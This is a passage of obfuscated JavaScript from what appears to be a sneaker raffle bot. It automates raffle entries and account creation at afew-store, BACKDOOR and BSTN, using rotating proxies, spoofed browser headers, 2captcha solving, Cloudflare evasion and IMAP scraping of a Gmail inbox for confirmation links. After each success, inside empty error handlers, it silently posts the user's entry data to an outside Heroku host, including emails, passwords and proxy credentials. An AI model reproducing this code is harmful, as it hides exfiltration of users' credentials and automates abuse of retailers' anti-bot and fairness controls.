                        var _0x3d5c9e = JSON['parse'](_0x7a56eb['readFileSync']('sizes.json', 'utf-8')), _0x5b8020 = _0x27b9e0[_0x558fbd]['Url'], _0x19af47 = _0x27b9e0[_0x558fbd]['Size'], _0x21c3e0;
                        async function _0x52853f() {
                            var _0x355b1c = new _0x25ee0a['CookieJar']();
                            console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x137dfc;
                            let _0x1d7b9e = {
                                'method': 'GET',
                                'cookieJar': _0x355b1c,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x31a1af[0x2] + ':' + _0x31a1af[0x3] + '@' + _0x31a1af[0x0] + ':' + _0x31a1af[0x1]
                            }, _0x49ba21 = _0x5b8020['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x1bab86 = _0x49ba21 + '.json', _0x5a39df = await _0x3da5aa(_0x1bab86);
                            console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x228673 = _0x5a39df['data']['product']['variants'];
                            if (_0x19af47 != 'RANDOM') {
                                if (_0x228673[0x1]['option1']['includes']('W')) {
                                    const _0x3bd0df = _0x3d5c9e['women']['find'](_0x4a3ef5 => _0x4a3ef5['EUsize'] === _0x19af47);
                                    _0x3bd0df && (_0x19af47 = _0x3bd0df['size']);
                                } else {
                                    if (_0x228673[0x1]['option1']['includes']('Y')) {
                                        const _0x24ee89 = _0x3d5c9e['men']['find'](_0x58c737 => _0x58c737['EUsize'] === _0x19af47);
                                        _0x24ee89 && (_0x19af47 = _0x24ee89['size'] + 'Y');
                                    } else {
                                        const _0x1b92b1 = _0x3d5c9e['men']['find'](_0x53047e => _0x53047e['EUsize'] === _0x19af47);
                                        _0x1b92b1 && (_0x19af47 = _0x1b92b1['size']);
                                    }
                                }
                                for (var _0xb8cdd0 of _0x228673) {
                                    _0xb8cdd0['option1'] == _0x19af47 && (_0x137dfc = _0xb8cdd0['id']);
                                }
                            } else {
                                var _0x4d1ccb = Math['round'](Math['random']() * (_0x228673['length'] - 0x1));
                                _0x137dfc = _0x228673[_0x4d1ccb]['id'];
                            }
                            console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3da5aa('https://raffles.afew-store.com/cart/' + _0x137dfc + ':1'), _0x21c3e0 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x52853f();
                        } catch (_0x38467a) {
                            if (_0x38467a['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x38467a);
                        }
                        const _0x26dfe3 = await _0xd245dd['newPage']();
                        await _0x26dfe3['setDefaultNavigationTimeout'](0x1d4c0), await _0x26dfe3['authenticate']({
                            'username': '' + _0x31a1af[0x2],
                            'password': '' + _0x31a1af[0x3]
                        }), await _0x26dfe3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x26dfe3['setRequestInterception'](!![]), _0x26dfe3['on']('request', _0x3220b6 => {
                            _0x3220b6['resourceType']() === 'image' || _0x3220b6['resourceType']() === 'font' || _0x3220b6['resourceType']() === 'media' ? _0x3220b6['abort']() : _0x3220b6['continue']();
                        });
                        try {
                            await _0x26dfe3['goto'](_0x21c3e0, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x26dfe3['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x26dfe3['type']('#checkout_email', '' + _0x27b9e0[_0x558fbd]['Email']), await _0x140651(0x320), await _0x26dfe3['type']('#checkout_attributes_instagram', '' + _0x27b9e0[_0x558fbd]['Follower']), await _0x140651(0x320), await _0x26dfe3['select']('#checkout_shipping_address_country', '' + _0x27b9e0[_0x558fbd]['Country']), await _0x26dfe3['waitForTimeout'](0x258), await _0x26dfe3['type']('#checkout_shipping_address_first_name', '' + _0x27b9e0[_0x558fbd]['FirstName']), await _0x26dfe3['waitForTimeout'](0x320), await _0x26dfe3['type']('#checkout_shipping_address_last_name', '' + _0x27b9e0[_0x558fbd]['LastName']), await _0x26dfe3['waitForTimeout'](0x2bc), await _0x26dfe3['type']('#checkout_shipping_address_address1', _0x27b9e0[_0x558fbd]['Address1'] + '\x20' + _0x27b9e0[_0x558fbd]['HouseNumber']), await _0x26dfe3['waitForTimeout'](0x2bc), await _0x26dfe3['type']('#checkout_shipping_address_address2', '' + _0x27b9e0[_0x558fbd]['Address2']), await _0x26dfe3['waitForTimeout'](0x2bc), await _0x26dfe3['type']('#checkout_shipping_address_zip', '' + _0x27b9e0[_0x558fbd]['Zip']), await _0x26dfe3['waitForTimeout'](0x2bc), await _0x26dfe3['type']('#checkout_shipping_address_city', '' + _0x27b9e0[_0x558fbd]['City']), await _0x26dfe3['waitForTimeout'](0x2bc);
                        if (_0x27b9e0[_0x558fbd]['State'] != '')
                            try {
                                const _0x369d8f = JSON['parse'](_0x7a56eb['readFileSync']('States.json', 'utf8'));
                                await _0x140651(0x1f4);
                                if (_0x27b9e0[_0x558fbd]['State']['length'] > 0x2)
                                    for (let _0xb96954 of _0x369d8f) {
                                        if (_0xb96954['Province'] == _0x27b9e0[_0x558fbd]['State']) {
                                            await _0x26dfe3['select']('#checkout_shipping_address_province', _0xb96954['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x26dfe3['select']('#checkout_shipping_address_province', _0x27b9e0[_0x558fbd]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x140651(0x190), _0x26dfe3['evaluate'](() => {
                            const _0x71d63 = document['querySelector']('#continue_button');
                            for (var _0x98324 = 0x0; _0x98324 < 0x5; _0x98324++) {
                                if (_0x71d63) {
                                    _0x71d63['click'](), _0x71d63['click']();
                                    break;
                                } else
                                    _0x140651(0xfa0);
                            }
                        }), await _0x26dfe3['waitForTimeout'](0x9c4);
                        try {
                            await _0x26dfe3['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x26dfe3['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x4e9334 => _0x4e9334['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x26dfe3['waitForTimeout'](0x7d0), console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x26dfe3['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x140651(0x3e8), await _0x26dfe3['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0xb2e4ff => _0xb2e4ff['submit']()), await _0x140651(0x3e8);
                        try {
                            await _0x26dfe3['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x26dfe3['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x2ae4b6 => _0x2ae4b6['submit']());
                        try {
                            await _0x26dfe3['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4a5bc = 'no', _0x1ce4fb(_0x27b9e0[_0x558fbd], _0x4f6f69), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                                try {
                                    await _0x29bde2(_0x342ed0['webhook'], _0x34b950['succesDEVMSG']);
                                } catch {
                                }
                            await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x34b950['succesDEVMSG']), await _0x140651(0xc8);
                            try {
                                await _0x29bde2(_0x259650, _0x34b950['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x34b198['replace']('#', ''),
                                    'module': _0x4f6f69['name'],
                                    'entrydata': JSON['stringify'](_0x1c5a32),
                                    'proxy': '' + _0x5f2dae[_0x558fbd]
                                };
                                var _0x32a6f1 = JSON['stringify'](prxdata);
                                let _0xbd8194 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x32a6f1, _0xbd8194);
                            } catch (_0x5806e8) {
                            }
                        } catch (_0x551192) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x591160) {
                        _0x591160['message']['includes']('selector') && (_0x591160 = 'Connection\x20Error');
                        console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20' + _0x591160)), _0x214a3d = '' + _0x591160;
                        var _0xf02359 = await _0x11b6e5(_0x27b9e0[_0x558fbd], _0x4f6f69, 'dev', !![], _0x214a3d);
                        _0x34b950['errorDEV'] = { 'embeds': [_0xf02359] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x34b950['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x34b950['errorDEV']), _0x4a5bc = 'yes';
                    } finally {
                        _0xd245dd && _0xd245dd['close']();
                        if (_0x4a5bc == 'yes' && _0x3df029 != 0x5 && _0x214a3d != 'Size\x20Not\x20Found') {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Retrying\x20(' + _0x3df029 + '\x20/\x205)')), _0x558fbd = _0x558fbd - 0x1, _0x3df029 = _0x3df029 + 0x1;
                            continue;
                        }
                        _0x4a5bc == 'yes' && _0x3df029 >= 0x5 && (_0x13d7e5(_0x27b9e0[_0x558fbd], _0x4f6f69), _0x4a5bc = 'no', _0x3df029 = 0x0);
                        if (_0x558fbd + 0x1 == _0x27b9e0['length']) {
                            await _0x140651(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x342ed0['AfewDelay'] + '\x20ms'), await _0x140651(_0x342ed0['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x2b1f63, _0x12bda5, _0x543282) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x7a56eb['writeFileSync']('proxies.txt', '');
                for (proxy in _0x543282) {
                    _0x7a56eb['appendFileSync']('proxies.txt', _0x543282[proxy] + '\x0a');
                }
                for (var _0x22a5c5 = 0x0; _0x22a5c5 < _0x12bda5['length']; _0x22a5c5++) {
                    await _0x58ea73(_0x12bda5, _0x22a5c5), _0x7a56eb['appendFileSync']('tasks.csv', '\x0a' + _0x12bda5[_0x22a5c5]['Url'] + ',' + _0x12bda5[_0x22a5c5]['Size'] + ',' + _0x12bda5[_0x22a5c5]['Email'] + ',' + _0x12bda5[_0x22a5c5]['Password'] + ',' + _0x12bda5[_0x22a5c5]['FirstName'] + ',' + _0x12bda5[_0x22a5c5]['LastName'] + ',' + _0x12bda5[_0x22a5c5]['Address1'] + ',' + _0x12bda5[_0x22a5c5]['Address2'] + ',' + _0x12bda5[_0x22a5c5]['HouseNumber'] + ',' + _0x12bda5[_0x22a5c5]['Zip'] + ',' + _0x12bda5[_0x22a5c5]['City'] + ',' + _0x12bda5[_0x22a5c5]['Country'] + ',' + _0x12bda5[_0x22a5c5]['State'] + ',' + _0x12bda5[_0x22a5c5]['CardNumber'] + ',' + _0x12bda5[_0x22a5c5]['ExpiryDate'] + ',' + _0x12bda5[_0x22a5c5]['CVV'] + ',' + _0x12bda5[_0x22a5c5]['NameOnCard'] + ',' + _0x12bda5[_0x22a5c5]['Phone'] + ',' + _0x12bda5[_0x22a5c5]['Follower']);
                }
                let _0x2b0e25 = {
                    'username': _0x34b198,
                    'delay': _0x342ed0['delay'],
                    'version': _0x4e463c,
                    'webhook': _0x342ed0['webhook']
                };
                const _0x7900f1 = JSON['stringify'](_0x2b0e25)['replace'](/"/g, '\x5c\x22');
                await _0x140651(0x3e8), _0x315f6a('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x7900f1
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x431e1d, _0x3ff187, _0x183704) {
                    var _0x426fce = _0x3ff187, _0xb6959d = 0x0;
                    for (var _0x1c9921 = 0x0; _0x1c9921 < _0x3ff187['length']; _0x1c9921++) {
                        maxTasks = Number(_0x342ed0['threads']);
                        while (_0xb6959d >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        async function _0x3f1144(_0x1aaad2, _0x4de952, _0x27c9d7, _0x57c357, _0x34c6f4) {
                            _0xb6959d++, _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x342ed0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x17c3b4;
                            try {
                                await _0x58ea73(_0x4de952, _0x57c357);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1b4448(_0x1aaad2['name'] + '\x20Task\x20' + (_0x57c357 + 0x1) + '\x20/\x20' + _0x4de952['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                            var _0x570533 = await _0x11b6e5(_0x4de952[_0x57c357], _0x1aaad2, 'acc', ![]);
                            const _0x5f19b1 = { 'succesDEVMSG': { 'embeds': [_0x570533] } }, _0x11363d = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x5297f3 = Math['round'](Math['random']() * (_0x27c9d7['length'] - 0x1)), _0x5cf0b8 = _0x27c9d7[_0x5297f3]['split'](':'), _0xb06ac;
                            try {
                                _0xb06ac = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5cf0b8[0x0] + ':' + _0x5cf0b8[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0xb06ac = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5cf0b8[0x0] + ':' + _0x5cf0b8[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x358780 = await _0xb06ac['newPage']();
                                await _0x358780['authenticate']({
                                    'username': '' + _0x5cf0b8[0x2],
                                    'password': '' + _0x5cf0b8[0x3]
                                }), console['log'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x358780['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x358780['setRequestInterception'](!![]), _0x358780['on']('request', _0x511201 => {
                                    _0x511201['resourceType']() === 'image' ? _0x511201['abort']() : _0x511201['continue']();
                                });
                                try {
                                    await _0x358780['goto']('' + _0x11363d), await _0x358780['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x358780['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x140651(0x7d0), console['log'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x140651(0x190), await _0x358780['waitForSelector']('#firstname'), await _0x358780['focus']('#firstname'), await _0x358780['keyboard']['down']('Control'), await _0x358780['keyboard']['press']('A'), await _0x140651(0xc8), await _0x358780['keyboard']['up']('Control'), await _0x358780['keyboard']['press']('Backspace'), await _0x358780['type']('#firstname', _0x4de952[_0x57c357]['FirstName'], { 'delay': 0xf0 }), await _0x140651(0x190), await _0x358780['focus']('#lastname'), await _0x358780['keyboard']['down']('Control'), await _0x358780['keyboard']['press']('A'), await _0x140651(0xc8), await _0x358780['keyboard']['up']('Control'), await _0x358780['keyboard']['press']('Backspace'), await _0x358780['type']('#lastname', _0x4de952[_0x57c357]['LastName'], { 'delay': 0xe6 }), await _0x140651(0x190), await _0x358780['focus']('#email_address'), await _0x358780['keyboard']['down']('Control'), await _0x358780['keyboard']['press']('A'), await _0x140651(0xc8), await _0x358780['keyboard']['up']('Control'), await _0x358780['keyboard']['press']('Backspace'), await _0x358780['type']('#email_address', _0x4de952[_0x57c357]['Email'], { 'delay': 0x122 }), await _0x140651(0x190), await _0x358780['type']('#password', _0x4de952[_0x57c357]['Password'], { 'delay': 0x82 }), await _0x140651(0x1f4), await _0x358780['type']('#password-confirmation', _0x4de952[_0x57c357]['Password'], { 'delay': 0x7c }), console['log'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x140651(0x2bc), await _0x358780['$eval']('#form-validate', _0x52a361 => _0x52a361['submit']()), await _0x140651(0x1388);
                                const _0x5eb49a = await _0x358780['$']('#email_address-error');
                                if (_0x5eb49a)
                                    throw new Error('Invalid\x20Email');
                                const _0x3dd53b = await _0x358780['$']('#password-error');
                                if (_0x3dd53b)
                                    throw new Error('Invalid\x20Password');
                                await _0x358780['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Account\x20' + _0x4de952[_0x57c357]['Email'] + '\x20Generated')), _0x7a56eb['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4de952[_0x57c357]['Email'] + ',' + _0x4de952[_0x57c357]['Password']);
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x5f19b1['succesDEVMSG']);
                                } catch {
                                }
                                await _0x29bde2(_0x36741f, _0x5f19b1['succesDEVMSG']);
                                let _0x43a521 = _0x4de952[_0x57c357];
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'module': _0x1aaad2['name'],
                                        'entrydata': JSON['stringify'](_0x43a521),
                                        'proxy': '' + _0x27c9d7[_0x57c357]
                                    };
                                    var _0x59ecf7 = JSON['stringify'](prxdata);
                                    let _0x32d29c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x59ecf7, _0x32d29c);
                                } catch (_0x44082c) {
                                }
                                console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x5b3ed0) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20' + _0x5b3ed0)), _0x17c3b4 = '' + _0x5b3ed0;
                                var _0x337aa7 = await _0x11b6e5(_0x4de952[_0x57c357], _0x1aaad2, 'acc', !![], _0x17c3b4);
                                _0x5f19b1['errorDEV'] = { 'embeds': [_0x337aa7] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x5f19b1['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x5f19b1['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0xb06ac)
                                    _0xb06ac['close']();
                                if (retry == 'yes' && _0x34c6f4 < 0x5)
                                    return console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Task\x20' + (_0x57c357 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x34c6f4 + 0x1) + '\x20/\x205)')), _0xb6959d--, _0x34c6f4 = _0x34c6f4 + 0x1, _0x3f1144(_0x1aaad2, _0x4de952, _0x27c9d7, _0x57c357, _0x34c6f4);
                                retry == 'yes' && _0x34c6f4 >= 0x5 && (_0x13d7e5(_0x4de952[_0x57c357], _0x1aaad2), retry = 'no', _0x34c6f4 = 0x0), _0xb6959d--, console['log'](_0x597cbe() + '\x20[' + _0x1aaad2['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                            }
                        }
                        _0x3f1144(_0x431e1d, _0x426fce, _0x183704, _0x1c9921, 0x0), await _0x140651(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x27e58a, _0x15b880) {
                    var _0xb14574 = ![], _0x3c0602 = [], _0xcad4f1 = 0x0;
                    async function _0x6d6a60() {
                        var _0x57430c = new _0x4d6860({
                            'user': _0x342ed0['masterMail'],
                            'password': _0x342ed0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x55e061(_0x1fb156) {
                            _0x57430c['openBox']('INBOX', ![], _0x1fb156);
                        }
                        _0x57430c['once']('ready', function () {
                            _0x55e061(function (_0x433712, _0x5b7379) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x433712)
                                    throw _0x433712;
                                _0x57430c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x4246a6, _0x48c677) {
                                    if (!_0x48c677 || !_0x48c677['length'])
                                        console['log'](_0x597cbe() + '\x20[' + _0x27e58a['name'] + ']\x20No\x20mails\x20found'), _0x57430c['end']();
                                    else {
                                        var _0x915170 = _0x57430c['seq']['fetch'](_0x48c677, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x915170['on']('message', function (_0x5c6370, _0x3d7e28) {
                                            var _0x2ef5da = '(#' + _0x3d7e28 + ')\x20';
                                            _0x5c6370['on']('body', function (_0x25d8d9, _0x1fe502) {
                                                _0x502d57(_0x25d8d9, (_0x12ea3c, _0x168523) => {
                                                    var _0x40bc61 = _0x168523['text']['split']('customer/account/confirm/')[0x1], _0x420a13 = _0x40bc61['split'](']')[0x0], _0x4657c9 = _0x420a13['split']('>')[0x0];
                                                    _0x3c0602['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x4657c9);
                                                });
                                            }), _0x5c6370['once']('end', function () {
                                            });
                                        }), _0x915170['once']('error', function (_0x79cd5e) {
                                            console['log']('Fetch\x20error:\x20' + _0x79cd5e), _0xb14574 = !![];
                                        }), _0x915170['once']('end', function () {
                                            _0x57430c['end'](), _0xb14574 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x57430c['once']('error', function (_0x1023e5) {
                            console['log'](_0x16a3a0['red'](_0x1023e5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xb14574 = !![];
                        }), _0x57430c['once']('end', async function () {
                            _0xb14574 = !![];
                        }), _0x57430c['connect']();
                    }
                    try {
                        _0x6d6a60();
                        while (!_0xb14574) {
                            await _0x140651(0xfa0);
                        }
                        console['log']('Found\x20' + _0x3c0602['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x140651(0x7d0);
                    }
                    for (var _0x5c055d = 0x0; _0x5c055d < _0x3c0602['length']; _0x5c055d++) {
                        maxTasks = Number(_0x342ed0['threads']);
                        while (_0xcad4f1 >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        async function _0x55af41(_0x12d0aa, _0x43d1dc, _0x468618, _0x532457, _0x25c050) {
                            _0xcad4f1++, _0x51ff47['use'](_0x30c330());
                            if (_0x4e0b34 != 'yes')
                                var _0x4e0b34 = '', _0x25c050 = 0x0;
                            var _0xc929c2 = Math['round'](Math['random']() * (_0x468618['length'] - 0x1)), _0x353434 = _0x468618[_0xc929c2]['split'](':'), _0x4ffb9d;
                            try {
                                _0x4ffb9d = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x353434[0x0] + ':' + _0x353434[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4ffb9d = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x353434[0x0] + ':' + _0x353434[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4c9aa1 = await _0x4ffb9d['newPage']();
                                await _0x4c9aa1['authenticate']({
                                    'username': '' + _0x353434[0x2],
                                    'password': '' + _0x353434[0x3]
                                }), console['log'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x4c9aa1['setRequestInterception'](!![]), _0x4c9aa1['on']('request', _0x2b2247 => {
                                    _0x2b2247['resourceType']() === 'image' ? _0x2b2247['abort']() : _0x2b2247['continue']();
                                }), console['log'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x4c9aa1['goto'](_0x43d1dc[_0x532457]);
                                } catch (_0x3bb0bc) {
                                    _0x4e0b34 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x3bb0bc);
                                }
                                console['log'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4c9aa1['waitForTimeout'](0xbb8);
                                try {
                                    await _0x4c9aa1['waitForSelector']('.account-nav'), _0x4e0b34 = 'no', console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3ee5f5 = await _0x11b6e5(null, _0x12d0aa, 'ver', ![]);
                                    const _0x4236c4 = { 'succesDEVMSG': { 'embeds': [_0x3ee5f5] } };
